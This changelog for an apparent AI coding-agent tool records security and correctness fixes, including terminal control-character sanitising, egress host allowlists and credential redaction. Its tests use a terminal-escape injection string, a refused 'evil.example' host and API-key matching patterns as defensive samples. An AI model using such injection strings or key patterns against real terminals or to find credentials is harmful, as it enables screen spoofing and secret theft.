# Atelier Spec — Changelog

## v60.32 — 2026-05-19 (Runner correctness + test-seam discipline — M01–M06)

First medium-severity bundle from `tasks/plan_medium_severity_fixes.md`. Six file-disjoint fixes across `crates/atelier-cli/src/{main.rs,runner.rs,lib.rs}`, `crates/atelier-cli/src/bin/conformance_status.rs`, and `crates/atelier-cli/Cargo.toml`.

- **M01 — `OPENAI_BASE_URL` precedence pinned + traced.** Extracted `resolve_openai_base_url(from_cli_or_profile, from_env)` so the documented `CLI > profile > env > default` order is a pure function and the live path emits a one-shot `tracing::info!` recording which layer won. Three new unit tests in `runner::tests::base_url_*` pin each layer.
- **M02 — `AwaitingUser` final state exits 6.** New `atelier_cli::exit_code_for_final_state` helper maps `State::AwaitingUser` to 6 and every other terminal state to 0; the binary's `run_run` calls it. 130/143 stay reserved for the v60.29 signal handlers; adapter errors stay on 1. New integration test `crates/atelier-cli/tests/exit_codes.rs` drives a Mock that emits text without `claimed_done` and asserts the run lands in `AwaitingUser` + the helper maps it to 6.
- **M03 — Compact-retry re-projects `messages_for_call` from post-mutation context.** The per-turn projection is now a closure (`project_messages_for_call`) called at the head of every overflow-retry iteration. On a successful compaction the runner snapshots the picked context items' text before the mutator runs, then trims the matching User/Assistant rows from `messages` so the retry payload is strictly smaller. New `compact_retry_rebuilds_messages_for_call_from_post_mutation_context` integration test asserts call 2's payload is smaller than call 1's and that the original prompt no longer appears in the retry.
- **M04 — `Runner::swap_adapter` no longer sync-shaped behind `async`.** Removed the `async` annotation; the function holds only `parking_lot::Mutex` guards (no `.await`). Updated both test call sites to drop the `.await`. Lower future-deadlock risk for the next caller who adds an `.await` inside the body.
- **M05 — `conformance-status` resolves its data file at run time.** `default_artifact_path` now reads `ATELIER_PROJECT_DIR` (when set) or the runtime CWD, falling back to `tests/phase_b_gate/last_run.json` relative to either. A new `--debug` flag preserves the build-time `CARGO_MANIFEST_DIR` path for the in-tree seed test. New `default_artifact_path_prefers_project_dir_env_then_cwd` test pins both layers.
- **M06 — Test-seam discipline.** New `test-seams` Cargo feature on `atelier-cli` (default off). Gated `with_adapter_for_test`, `with_starting_strategy_override`, `with_tier1_diagnostics_for_test`, `with_degradation_window`, `with_degradation_threshold` under `#[cfg(any(test, feature = "test-seams"))]`; the integration-test crate enables the feature via a self-referential `dev-dependencies` entry. Production builds can no longer pin stale strategies through these seams. Fixed the pre-existing v60.29 `--all-targets` clippy warning on `Runner::with_external_cancel` with a targeted `#[allow(dead_code)]` (the binary uses it; the lib's test compilation doesn't); added module-level `#[allow(dead_code)]` to the `#[path]` includes in `tests/sigint_resume.rs` so partial surface coverage stops tripping clippy.

### Verification

- `cargo fmt --check` — clean.
- `cargo clippy --workspace --all-targets -- -D warnings` — clean (M06 closes the pre-existing `with_external_cancel` warning).
- `cargo test -p atelier-core` — 852 passed, no regressions.
- `cargo test -p atelier-cli` — 233 passed across nine binaries / test crates including the three new tests (`base_url_*` ×3, `exit_codes::*` ×2, `compact_retry_*` ×1, `default_artifact_path_prefers_project_dir_env_then_cwd` ×1).
- `cargo build --no-default-features -p atelier-cli` — succeeds (M06 feature is off by default).
- `make check` — 115 rig tests + 14 workload dry-runs green.

## v60.30 — 2026-05-18 (TUI / frontend hygiene — H13–H15 + UI Mediums)

Hardening pass on the TUI lifecycle, the TUI render path, and the GUI's inline-content renderers. Three high-severity bullets (H13–H15) plus five medium-severity UI items land together because they're file-disjoint with v60.28 / v60.29 but co-located in `crates/atelier-tui/` and `crates/atelier-gui/ui/`.

### TUI (`crates/atelier-tui/src/lib.rs`)

- **H13 — TerminalGuard ordering + panic hook.** New `setup_terminal_with(build_terminal)` helper enables raw mode, binds `TerminalGuard` immediately afterwards, then runs `EnterAlternateScreen` + `Terminal::new`. A `?` on either subsequent step now still tears raw mode back down on the way out. Idempotent `install_panic_hook()` calls `disable_raw_mode` + `LeaveAlternateScreen` and chains the previous hook, covering `panic = "abort"` builds where `Drop` is skipped. New `terminal_guard_tests::setup_terminal_with_failing_builder_does_not_leak_raw_mode` injects a `Terminal::new` failure and asserts the cleanup path.
- **H14 — `KeyEventKind::Press` filter.** One-line guard at the top of `handle_key` ignores `Release` / `Repeat` events. Windows + kitty terminals emit all three kinds for a single keystroke; without the filter a `q` keydown was being interpreted twice. New `tests::handle_key_ignores_release_events` covers the no-op path.
- **H15 — ANSI / control-char sanitiser.** New `safe_span(s) -> String` strips C0 (`\x1b`, `\x07`, `\x9b`, …) and C1 (`\u{0080}..=\u{009f}`) control bytes except `\t` and `\n`, and rewrites bidi-override + zero-width chars (`U+202E` → `<RLO>`, `U+200B` → `<ZWSP>`, etc.). Applied at every `Span::raw` / `Span::styled` site that consumes externally-supplied strings: conversation lines, file paths (committed + pending), claimed-change "why" rationale, plan step text + constraints, diff `-`/`+` lines, context-item labels, memory-card titles, event-log details. Static UI labels keep the unwrapped form. New `sanitiser_tests` module covers ESC/BEL/CSI stripping, tab + newline preservation, bidi/zero-width rewriting, idempotence across mixed inputs, and an end-to-end `render_conversation_neutralises_ansi_clear` test that feeds `"\x1b[2JOWNED"` through `push_conversation` and walks every cell of the rendered `Buffer` to assert no ESC byte made it to screen.

### GUI mediums (`crates/atelier-gui/ui/`)

- **Mermaid `securityLevel: 'strict'` + DOM-id escape** (`InlineRenderers.svelte`). Mermaid is initialised exactly once via a memoised `getMermaid()` singleton that passes `securityLevel: 'strict'`. Block ids are run through `safeDomId()` (alphanumerics + `_-` only) before reaching the `data-mermaid-target` attribute, the `querySelector` lookup, and the `mermaid.render(...)` id argument.
- **DOMPurify-free SVG injection** (`InlineRenderers.svelte`). Replaces `target.innerHTML = svg` with a `DOMParser`/`importNode` path: parse the mermaid output as `image/svg+xml`, accept only when the documentElement is `<svg>`, and `appendChild` the imported node. DOMPurify is not yet in the dep tree; the parse-and-whitelist path doesn't add a dependency. Error states build their DOM via `textContent` so exception strings can't smuggle markup.
- **`resolveImageSrc` allow-list** (`InlineRenderers.svelte`). Rejects paths containing `..`, absolute filesystem paths, and unknown extensions before calling `convertFileSrc`. Whole-line image detection now requires the markdown `![alt](rel/path.ext)` form via `MD_IMAGE_LINE`; bare filenames are plain prose.
- **Concurrent-edit modal inerting** (`App.svelte`). The DiffPane slot now carries `inert` + `aria-hidden="true"` while `app.concurrentEditModal` is open, so an in-flight resolve can't accept stale hunks via Enter.
- **AppState default arm** (`state.ts`). The silent `default:` in `applyEvent` now `console.error`s the unknown variant and `throw`s when `import.meta.env.DEV` is true; production builds still fall through to the event-log append so the user sees something happened.

### Verification

- `cargo test -p atelier-tui` — 103 passed (94 existing + 9 new across `tests::handle_key_ignores_release_events`, `sanitiser_tests::*`, `terminal_guard_tests::*`).
- `cargo clippy -p atelier-tui -- -D warnings` — clean.
- `cargo fmt --check` + `cargo clippy -- -D warnings` workspace — clean.
- `cargo test -p atelier-core` — 827 passed, no regressions.
- `make check` — 112 rig tests + 14 workload dry-runs green.
- `cd crates/atelier-gui/ui && npm run check` — 0 errors, 0 warnings (no `npm run test` script defined).

## v60.29 — 2026-05-18 (Liveness & durability — H9–H12)

The "liveness & durability" bundle from `tasks/plan_high_severity_fixes.md`. Four targeted hardening touches on `crates/atelier-core/src/{dispatcher.rs,file_watcher.rs,staging.rs}` and `crates/atelier-cli/src/{runner.rs,main.rs}`.

### H9 — `CancellationToken` + per-tool deadline threaded into `ToolContext`

`ToolContext` gains two new fields: `cancel: tokio_util::sync::CancellationToken` and `deadline: std::time::Duration`. `Dispatcher::dispatch` resolves the per-call deadline (manifest override via the new `Tool::deadline_override()` method, else caller default), then races the tool future inside a `tokio::select!` against `cancel.cancelled()` and `tokio::time::sleep(deadline)`. Two new `ToolError` variants — `Cancelled { tool }` and `Deadline { tool, deadline }` — surface the race outcomes; both pinned in the `tool_error_kind_labels_are_stable` L-D-5 wire-label test and listed under `schemas/session/v1.json:tool_fixtures.error.kind`. `Cancelled` routes to `Recovery::Fail` (don't retry into the same trip), `Deadline` to `Recovery::Retry`. `DEFAULT_TOOL_DEADLINE = 60s`; per-tool override via `tool_manifest.v1.json:deadline_ms` (new optional field, schema-validated, consumed by both `BuiltInToolWrapper` and `McpToolWrapper::new_with_deadline`). Four new tests in `dispatcher::cancellation_tests` pin: deadline expiry within 300ms of a 5s tool with 200ms budget, pre-armed cancel short-circuits, mid-flight cancel aborts a sleeping tool, and `deadline_override` shrinks an over-generous caller default.

### H10 — SIGINT/SIGTERM handler in CLI `main`

`atelier-cli/src/main.rs::run_run` now wires a `tokio_util::sync::CancellationToken` through the new `Runner::with_external_cancel` builder and races `runner.run(prompt)` against `tokio::signal::ctrl_c()` plus (unix only) `signal(SignalKind::terminate())`. On signal: trips the token, awaits the run future so the existing `OnDiskSession::save_to` tail in `Runner::run` persists the partial session, exits 130 (SIGINT) / 143 (SIGTERM) per POSIX. New `atelier_core::session::spawn_with_cancel_token` lets the runner adopt the caller's token instead of minting its own — same `Handle` shape, drop-in for the default `spawn` path. New integration test `crates/atelier-cli/tests/sigint_resume.rs::external_cancel_writes_partial_session_to_disk` cancels mid-run via the external token and asserts the on-disk `session.json` is non-empty and resume-able; `binary_handles_sigint_cleanly_and_exits_130` spawns the actual `atelier` binary, sends `SIGINT`, and asserts a clean exit.

### H11 — Atomic `write_with_sync` in staging

`crates/atelier-core/src/staging.rs::write_with_sync` now writes to a sibling `{path}.atelier-tmp.<pid>.<rand>`, `sync_all`s, renames to the final path, and `fsync_dir_best_effort`s the parent. Pre-v60.29 ordering was create→write→sync (the file existed at the final path zero-length between create and write). New `staging::durability_tests` injects a panic between the tmp-write and the rename via a thread-local hook; asserts the target either does not exist or holds full pre-existing contents — never zero-length. Two further tests pin the happy path: no tmp files leaked on success, and a clean overwrite of an existing target.

### H12 — Hoist canonicalize out of `file_watcher` lock

`crates/atelier-core/src/file_watcher.rs::track()` canonicalises once at the top, then takes the `parking_lot::Mutex` only for the `notify::watch` call and the `read_set.insert`. The notify-worker filter does the same: it canonicalises every pending raw path *before* locking the read-set so 32-way contention against a slow filesystem no longer serialises on the lock. The duplicate canonicalize at lines 99/123 is folded into one call routed through a new `canonicalize_for_track` helper (which carries a `#[cfg(test)]` slowdown hook). New `file_watcher::contention_tests::track_canonicalize_runs_outside_lock` arms 100ms-per-call canonicalize across 32 parallel `track()` invocations and asserts P99 per-call latency stays well below the serialised bound (was ~100ms × N before).

### Bundle gate

`cargo test -p atelier-core --lib -- staging:: file_watcher:: dispatcher::cancellation` and `cargo test -p atelier-cli --test sigint_resume` both green; standing gates `cargo fmt --check`, `cargo clippy -- -D warnings`, `cargo test -p atelier-core`, `cargo test -p atelier-cli`, and `make check` all green.

## v60.28 — 2026-05-18 (Secrets & egress hardening; H2–H8 + H16 from `deep_code_scan_v60.27.md`)

File-disjoint bundle of high-severity audit fixes scoped to BYOM adapters, the §15 MCP HTTP/SSE surface, the GUI's `swap_adapter` command, and one §2 schema typo. H1 (rotate the leaked `.envrc` Anthropic key) is an operator action tracked separately. Bundle gate: `cargo fmt --check`, `cargo clippy -- -D warnings`, `cargo test --workspace`, `make check` — all green.

- **H2** — `swap_adapter` Tauri command gates a base_url allowlist (`api.anthropic.com`, `api.openai.com`, `localhost`, `127.0.0.1`, `::1`) and emits an `AdapterSwapPending` → `AdapterSwapped | AdapterSwapRejected` consent flow on the event bus before tearing down the live adapter. New unit tests cover the allowlist (`evil.example` refused, loopback accepted) and the projection wire shape; the renderer-side accept/reject UI rides a follow-on bundle.
- **H3** — `crates/atelier-core/src/adapter/mod.rs` now exposes a `redact_response_body` helper that strips `sk-ant-*`, `sk-*` (20+ chars), `Bearer …`, and `"api_key": "…"` substrings, then UTF-8-safely caps to 256 chars. Wired into every construction site of `AdapterError::{Auth, Provider}` in `anthropic.rs` + `openai_compat.rs` so serialised errors (RunReport JSONL, session.json, GUI/TUI projections) can't leak credentials.
- **H4** — Credential-bearing reqwest clients in both adapters now build with `.redirect(reqwest::redirect::Policy::none())`. A new regression test stands up a wiremock returning 302 and asserts the adapter sees the status code rather than auto-following.
- **H5** — `schemas/config/mcp_servers.v1.json` + `McpServerManifest` gain `allowed_hosts: Option<Vec<String>>` (default = `[host(url)]` when omitted). `McpToolWrapper` carries an opt-in `EgressContext`; every `call_tool` checks the URL host against the allowlist and on mismatch returns `McpLaunchError::HostNotAllowed` plus a `blocked` audit row. `host_of_url` (no `url` crate dep — manual parse handling scheme/userinfo/IPv6/port) is unit-tested.
- **H6** — Per-`call_tool` egress emits an `mcp-http-request` row through the existing `append_mcp_egress` appender, populated with `provider`, `url`, `phase: "call-tool"`, `outcome`, optional `reason`, and `tool_name`. Schema unchanged; the launcher's handshake row and this row now share one NDJSON stream.
- **H7** — `resp.bytes().await?` replaced in both adapters' non-stream chat paths with a streamed `chunk()` accumulator capped at 32 MiB. New `AdapterError::ResponseTooLarge { limit }` variant + wire-label entry. Verification test feeds 32 MiB + 1 bytes through wiremock and asserts the error fires before the body lands in memory.
- **H8** — Per-event SSE accumulator (`current_event_data`) is capped at 8 MiB in both adapters. Overflow surfaces as `AdapterError::SseEventTooLarge { limit }` (also added to the L-D-5 wire-label/serde agreement test). Verification test feeds ~1000 `data:` lines totalling > 8 MiB and asserts the cap fires.
- **H16** — `schemas/protocol/overhead.v1.json` strategy enum now reads `["native_tool", "json_sentinel", "regex_prose"]` (was `json_mode`); the CLI's `strategy_wire_label` now delegates to `Strategy::as_str()` so the rename can't drift again. New `tests/test_schemas.py` sweep asserts every `strategy` enum across `schemas/` is a member of the canonical set.

Plus an `allowed_hosts` round-trip + wrong-type rejection test in `tests/test_schemas.py`, and the artifact in `tests/protocol/overhead.json` rewritten to the new spelling.

## v60.27 — 2026-05-18 (Phase B Track C3: hallucinating-agent fixture + §7 Tier-1 gate)

Closes the final Phase B closeout track. The §7 hallucinated-symbol gate fires within one turn on the new canonical fixture; the lying-vs-hallucinating priority lattice from L-D-9 is pinned in code; the v60.12 lying-agent gate is non-regressing. Once `experiments/lsp_spike/` resolves GO and `async-lsp` lands, the runner produces Tier-1 diagnostics directly instead of through the test seam below.

### New canonical fixture `tests/workload/canonical/t14_hallucinating_agent_typescript/`

Mirror of `t11_add_typescript_function`'s shape — `fixture/src/foo.ts` declares a `Foo` class with one real method (`bar`). The hallucinating-agent test scripts the mock to rewrite the file with a call to `foo.nonExistentMethod()`, which `typescript-language-server` reports as `Property 'nonExistentMethod' does not exist on type 'Foo'`. `meta.json` declares `expected_starting_returncode: 5` (no pytest tests in a TypeScript fixture — pytest's "no tests collected" exit code).

### New `VerificationRun::merged_tier1_lsp(envelope, observed, tier1_discrepancies)`

In `crates/atelier-core/src/verify.rs`. Pins the **L-D-9 priority lattice** in code:

1. **Discrepancies merge** — a turn that triggers BOTH Tier 1 AND Tier 3 emits all matching rows. No variant takes priority over another inside the `discrepancies` vec.
2. **The event's `tier` badge** uses the *highest tier that ran* — `Tier1Lsp` when the LSP receiver produced any input, even when the Tier-3 textual half also fired.

Three new unit tests pin all three lattice arms:
- `merged_tier1_lsp_uses_tier1_badge_when_lsp_fires` — both tiers fire; badge moves to Tier 1; all three discrepancies survive (Claimed + Unclaimed from Tier 3, HallucinatedSymbol from Tier 1).
- `merged_tier1_lsp_falls_back_to_tier3_when_no_lsp_input` — Tier 1 silent; badge stays Tier 3.
- `merged_tier1_lsp_clean_run_keeps_tier3_badge` — clean run; Tier 3 ran cleanly.

### New `SessionDispatcher::verify_pass_with_tier1`

Sibling of `verify_pass`. Takes `tier1_discrepancies: Vec<Discrepancy>` in addition to the envelope + observed. Same emission contract — exactly one of `VerificationPassed` / `VerificationFailed`. The bare `verify_pass` stays untouched for the v60.12 lying-agent path.

### New test seam `Runner::with_tier1_diagnostics_for_test`

Stands in for the live LSP receiver until `async-lsp` lands. When set, the runner's verify-pass call site uses `verify_pass_with_tier1` instead of `verify_pass`. `#[allow(dead_code)]` for the binary build. Once the spike resolves GO, the runner produces these from `lsp_types::Diagnostic` via the `crate::lsp::typescript::map_diagnostic_to_discrepancy` mapper (v60.26) and this builder stays unused — boundary is clean.

### New integration test `mock_hallucinating_agent_fixture_flagged_within_one_turn_phase_b_seven_gate`

In `crates/atelier-cli/tests/run_integration.rs`. Loads t14, runs the §2.5 loop with the test seam carrying one canonical TypeScript diagnostic, asserts:

- `report.final_state == Done`, `turns == 1`.
- Exactly one `Event::VerificationFailed { tier: Tier1Lsp, discrepancies }` on the bus.
- No `VerificationPassed` event (one terminal-marker per turn per the v62 contract).
- `discrepancies[0]` is `HallucinatedSymbol { path: "src/foo.ts", line: 9, column: 3, symbol: "nonExistentMethod", lsp_message: contains "does not exist on type 'Foo'" }`.

The v60.12 `mock_lying_agent_fixture_flagged_within_one_turn_phase_a_seven_gate` test still passes — verified post-change. No regression on the Tier-3 textual gate.

### Lessons applied

- **L-D-7** — the live LSP receiver still pending; the test seam is the bridge until it lands. The boundary is `DiagnosticInput` → `Discrepancy` (pure function v60.26); the receiver only needs to translate `lsp_types::Diagnostic` → `DiagnosticInput` and forward the result. No "claimed-but-broken" surface because the test seam ships fully wired today.
- **L-D-9** — priority lattice pinned in code via `merged_tier1_lsp` + the three sibling tests, not in prose. A future revision that wants different precedence has to update the helper *and* the tests.

### Verification

- `cargo test -p atelier-core --lib verify::` — 21 pass (+3 new `merged_tier1_lsp_*`).
- `cargo test -p atelier-cli --test run_integration mock_hallucinating_agent` — 1 pass.
- `cargo test -p atelier-cli --test run_integration mock_lying_agent` — 1 pass (regression check).
- `cargo test --workspace --lib` — full suite green.
- `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `make check` — 26/26 schemas valid, 61/61 artifacts validated (was 59; +2 for t14 meta + checks), 14/14 canonical workloads dry-run OK, 112 pytest tests pass.

### Phase B closeout — every track green at the code level

- **#1** §2 mechanical gate across three strategies — **done** v60.23.
- **#2** real-model conformance harness + nightly gate — **done in code** v60.24; data-blocked on 7-night calibration.
- **#3** §7 Tier-1 + hallucinating-agent — foundation v60.25 (C1); pure-function half v60.26 (C2); fixture + gate v60.27 (C3). Live LSP receiver pending spike resolution at `experiments/lsp_spike/`.
- **#4** DoD checklist reconciliation — done v60.21.
- **#5** `cargo fmt` / `clippy` / `test --workspace` / `make check` all green — preserved.
- **#6** Phase B gate-status binary — `atelier-conformance-status` ships v60.24; emits `YELLOW (calibration phase)` until the calibration window completes.

The remaining work to flip the Phase B gate fully green is **operator action**, not code:
- Execute the LSP spike at `experiments/lsp_spike/` and fill in the verdict matrix (then a v60.28 lands `async-lsp` + the receiver glue).
- Wire `ANTHROPIC_API_KEY` into GitHub Actions secrets so the nightly conformance gate starts accumulating data.
- After 7 nights of green conformance data, flip `CALIBRATION_PHASE` to `"false"` in `.github/workflows/nightly_phase_b_gate.yml` to enable assertion at `max(0.95, observed_p5)`.

## v60.26 — 2026-05-18 (Phase B Track C2: TypeScript Tier-1 verify — pure-function half)

Lands the pure-function half of the §7 Tier-1 LSP verify path: the new `Discrepancy::HallucinatedSymbol` variant + the TypeScript diagnostic-to-discrepancy mapper. The live LSP receiver (consuming `lsp_types::Diagnostic` from `async-lsp`) lands once `experiments/lsp_spike/` resolves a GO verdict — at which point the receiver translates `lsp_types::Diagnostic` → `crate::lsp::typescript::DiagnosticInput` → `map_diagnostic_to_discrepancy` and the existing path is wired end-to-end. The pure half ships today so Track C3's hallucinating-agent fixture has a producer it can target.

### New `Discrepancy::HallucinatedSymbol`

In `crates/atelier-core/src/verify.rs`:

```rust
HallucinatedSymbol {
    path: String,
    line: u32,         // 1-indexed (LSP wire is 0-indexed; mapper adds 1)
    column: u32,       // 1-indexed
    symbol: String,    // e.g. "nonExistentMethod"
    lsp_message: String,
}
```

`Discrepancy::wire_label()` and `Discrepancy::path()` extended to handle the new arm. `summary()` formats as `path:line:column: hallucinated symbol `X` — <lsp_message>` so log lines + the TUI event log can quote the LSP diagnostic directly. New `discrepancy_wire_labels_are_stable` test pins all five variants' wire labels per **L-D-5**.

### GUI bridge arm

`crates/atelier-gui/src/lib.rs::bridge_event` extended with the `HallucinatedSymbol` JSON shape: `{kind: "hallucinated_symbol", path, line, column, symbol, lsp_message}`. The Svelte side doesn't yet have a `VerificationFailed` reducer (the red-failed badge lands in Phase C); the new variant falls through the default event-log arm there, same as the other four `Discrepancy` variants. TUI projection automatically picks up the new arm via the existing `discrepancies.first().map(|d| d.summary())` call (no per-variant TUI arm needed — `summary()` covers it).

### New module `crates/atelier-core/src/lsp/typescript.rs`

Pure function: `map_diagnostic_to_discrepancy(path, &DiagnosticInput) -> Option<Discrepancy>`. Hand-rolled `DiagnosticInput { line_zero_indexed, character_zero_indexed, message }` mirrors the subset of `lsp_types::Diagnostic` the receiver consumes — keeps `lsp-types` out of `atelier-core` until the spike resolves.

Hallucinated-symbol heuristic recognises the two canonical `typescript-language-server` shapes via `strip_prefix`:

- `Property 'X' does not exist on type 'Y'` → `X`
- `Cannot find name 'X'` → `X`

Diagnostics that don't match return `None` so the caller falls through to Tier 3 textual without false-firing. `MAX_LSP_MESSAGE_BYTES = 1024` cap on `lsp_message` (matches the `schemas/audit/lsp_install.v1.json::reason.maxLength` posture); a runaway server emitting 4 KiB of message text gets truncated to 1 KiB + UTF-8-safe ellipsis.

Six unit tests cover both matching shapes, the unrelated-diagnostic null case, the 0→1-indexed line/column bump, the 1 KiB cap, and the UTF-8 boundary respect.

### Runner `verify_pass` wiring — already in place

The plan's "fix the v60.8 follow-on: actually call `dispatcher.verify_pass()` instead of just transitioning to `State::Verifying`" was discharged at v60.12 (Phase A close A4 — the lying-agent gate's regression test transitively requires `verify_pass` to fire). `runner.rs:1885-1906` already calls `session_dispatcher.verify_pass(&last_envelope, &observed_changes)` (or `emit_verify_not_run()` when nothing to weigh). The closeout plan's claim was based on the pre-v60.12 state — v60.26 inherits the fix.

### Lessons applied

- **L-D-5** — `Discrepancy::wire_label()` agreement test pins all five variants in one place; future renames force a deliberate edit on the bridge consumers.
- **L-D-7** — the pure-function mapper lands **before** the live LSP receiver, not after. The boundary is `DiagnosticInput`; the receiver can land in isolation once the spike resolves and the mapper is already proved against test fixtures.
- **L-D-9** — the lying-agent vs hallucinating-symbol priority lattice will land in C3's table-driven test (the plan defers the lattice pinning until the fixture exists to exercise it).

### Verification

- `cargo test -p atelier-core --lib verify::` — 18 pass (+2 new: `discrepancy_wire_labels_are_stable`, `hallucinated_symbol_summary_quotes_lsp_message_and_location`).
- `cargo test -p atelier-core --lib lsp::typescript` — 6 pass.
- `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings` clean.
- Full `cargo test --workspace --lib` green.

## v60.25 — 2026-05-18 (Phase B Track C1: LSP client foundation — data layer + spike harness)

Lands the data-layer foundation for §7 Tier-1 LSP verification. The spike harness exists (`experiments/lsp_spike/`); the spike verdict is **PENDING** — the operator must execute it against `typescript-language-server` and record the decision-matrix outcome in `experiments/lsp_spike/README.md` before the `LspServerHandle` + `launch_typescript_server` implementations land. Everything in this commit compiles without `async-lsp` as a dependency, so Tracks C2 and C3 can proceed against the data-layer surface while the spike runs.

### Spike harness `experiments/lsp_spike/`

Mirror of `experiments/rmcp_spike/`'s shape (per **L-D-3** — reuse the maturity-spike pattern). Three modes:

- `cargo run -- stdio` — happy path: spawn `npx -y typescript-language-server --stdio`, run the LSP `initialize` handshake, open a fixture `.ts` file with a deliberate type error (`foo.nonExistentMethod()`), wait for the matching `publishDiagnostics`.
- `cargo run -- crash` — kill the server mid-handshake with SIGKILL, observe how `async-lsp` surfaces the disconnect.
- `cargo run -- decline` — exit without `initialized`, simulating user dismissal of the first-use prompt; verify no zombie processes remain.

The harness is intentionally stub-shaped — the driver loop is sketched but not driven, so the harness builds standalone without npm install at compile time. The first operator to execute the spike fills in the driver based on async-lsp 0.2's docs and records GO / GO-WITH-CAVEATS / NO-GO. Empty `[workspace]` keeps the spike out of the main workspace per the v60.10 rmcp-spike pattern.

### New module `crates/atelier-core/src/lsp/approval.rs`

`LspApprovals` is a bit-for-bit mirror of v60.8's `McpApprovals`. Stable layout:

- `BTreeMap<String, String>` of `language → granted_at` (RFC 3339).
- `load()` / `save()` round-trip through `tempfile::NamedTempFile::persist` (per **L-D-4** — every cross-call write routes through the atomic pattern).
- Path: `<workspace>/.atelier/lsp/_approvals.json` (the `_` prefix matches the hooks + MCP convention so a misconfigured glob can't cross-contaminate trust surfaces).
- `approve` / `revoke` / `is_approved` for the in-memory ops.

Six unit tests cover round-trip persistence, idempotent re-approval, malformed-file detection, missing-file → empty-store semantics, and path convention.

### Expanded `crates/atelier-core/src/lsp/mod.rs`

The Day-0 prep (v60.22) shipped only `LspInstallOutcome`. v60.25 adds `tier_one_available()` for the decline-fallback decision (`Installed` / `AlreadyPresent` → Tier 1 available; `Declined` / `Failed` → Tier 2/3) plus re-exports of the new approval surface. Inline doc comments now point at the spike's PENDING status so a future reader picks up the foundation order.

### New schema `schemas/audit/lsp_install.v1.json`

One row per `Event::RequestLspInstall` → `Event::LspInstallResolved` round-trip. Lives in the same on-disk `audit.log` as `subprocess_egress.v1.json` / `mcp_egress.v1.json`, discriminated by `kind: "lsp-install"`. Fields: `language` (lowercase identifier, regex-validated), `candidate_packages` (minItems:1), `outcome` (referencing `LspInstallOutcome`'s wire labels), optional `duration_ms` / `package_manager` (enum of npm/pip/cargo/go/brew/system) / `version_installed` / `reason`.

`tests/validate_schemas.py` discovers it automatically (recursive glob); count moves from 25/25 → 26/26.

### Lessons applied

- **L-D-3** — `LspApprovals` reuses `McpApprovals`'s shape exactly; `LspInstallOutcome::tier_one_available()` lands the tier/fallback decision in one helper rather than scattered boolean checks across consumers.
- **L-D-4** — `LspApprovals::save` routes through `NamedTempFile::persist`.
- **L-D-5** — `LspInstallOutcome::wire_label()` agreement test was already in v60.22; v60.25 adds `tier_one_available_only_when_installed_or_already_present` to pin the helper.
- **L-D-7** — the spike harness lands **before** the foundation code that depends on it. No "claimed-but-broken" surface: `LspServerHandle` is not declared yet, so a downstream consumer can't accidentally call into nothing.

### What's NOT in this commit

- `async-lsp` / `lsp-types` deps in `atelier-core/Cargo.toml`. Those land in Track C2 once the spike verdict is GO.
- `LspServerHandle`, `launch_typescript_server`. Same dependency on the spike.
- `crate::lsp::typescript` module (the diagnostics → `Discrepancy::HallucinatedSymbol` mapper). Track C2.
- The first-use modal UI in GUI/TUI. The bus events are already plumbed (v60.22); the actual modal UI lands when the install subprocess is ready to invoke.

### Verification

- `cargo test -p atelier-core --lib lsp::` — 8 tests pass (2 `lsp::tests` + 6 `lsp::approval::tests`).
- `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `make check` — 26/26 schemas valid, 59/59 artifacts validated.

### Phase B closeout progress

- #1, #2, #4, #5, #6 — see v60.23 / v60.24 entries.
- #3 (Tier-1 detector + hallucinating-agent fixture) — foundation half landed in C1; producer + fixture land in C2 + C3 after the spike resolves.

## v60.24 — 2026-05-18 (Phase B Track A: §2 real-model conformance harness + nightly gate)

Lands the §2 real-model conformance half of the Phase B gate text. The mechanical half closed at v60.23 (Track D); v60.24 closes the harness side of the real-model half. The remaining piece is data accumulation — the workflow records-only for the first 7 nights per **L-D-6** + Phase B closeout decision row #3, then asserts at `max(0.95, observed_p5)`. Phase B closeout acceptance criteria #2 (measurement) is met; the gate-green criterion (#6) is data-blocked, not code-blocked.

### New types in `crates/atelier-core/src/protocol_conformance.rs`

- **`ConformanceSummary { strategy, total_turns, malformed_turns, rate }`** — per-strategy projection of the existing `ConformanceSnapshot`. `summaries()` method on the snapshot returns one row per observed strategy, suppressing zero-evidence strategies.
- **`ConformanceStatus { Green, Yellow, Red }`** — tier/fallback lattice per **L-D-3**. `wire_label()` returns stable `"green"` / `"yellow"` / `"red"` strings (agreement test `conformance_status_wire_labels_are_stable` per **L-D-5**). `for_summary(summary, floor, min_window)` is the per-row verdict; `for_run(summaries, floor, min_window)` is the aggregate, Red-dominant lattice.
- **`PHASE_B_CONFORMANCE_FLOOR: f32 = 0.95`** — pinned by `phase_b_conformance_floor_is_the_spec_provisional_value`. The PROVISIONAL spec §2 "≥95%" floor; calibration may push the effective threshold higher via the rolling 7-day p5.
- Six new unit tests covering the projection + lattice (`summaries_breaks_down_per_strategy_with_rate`, `for_run_returns_*`, `conformance_status_wire_labels_are_stable`).

### New schema `schemas/ci/protocol_conformance.v1.json`

Mirrors `phase_a_gate.v1.json`'s shape — one object per nightly run, with `summaries: Vec<ConformanceSummary>` + aggregate `status` + `calibration_phase` toggle + effective `floor`. `providers_tested` records which adapters the run touched. `tests/validate_artifacts.py` extended with the new rule; `make check` reports 59/59 artifacts validated (was 58 pre-v60.24).

### New binary `crates/atelier-cli/src/bin/conformance_status.rs`

Sibling of `phase_a_gate_status`. Reads `tests/phase_b_gate/last_run.json`; prints a header + per-strategy lines + a one-line digest; exits 0 (Green/Yellow), 1 (Red), or 2 (missing/malformed). 7 unit tests pin the exit-code contract + bundled-seed round-trip.

### New workflow `.github/workflows/nightly_phase_b_gate.yml`

07:00 UTC cron — 30 minutes after Phase A's 06:30 so the commits don't race. Runs the new `phase_b_live_anthropic_conformance` integration test, reads its `$ATELIER_PHASE_B_SUMMARY_PATH` output, composes `tests/phase_b_gate/last_run.json`, validates against the schema, commits back to main. The `ANTHROPIC_API_KEY`-gated step records `status: skipped` (with `all_passed: true`) when the secret is absent — same posture as `nightly_phase_a_gate.yml`'s live-Anthropic gate (v60.19).

### `RunReport.envelope_conformance: ConformanceSnapshot`

`Runner::run` now snapshots the cross-call envelope-parse ring buffer at end-of-run so test callers can fold per-strategy summaries without reaching into the runner's internals. Cheap: the snapshot allocates a small `Vec`.

### Live test `phase_b_live_anthropic_conformance` (`#[ignore]`-gated)

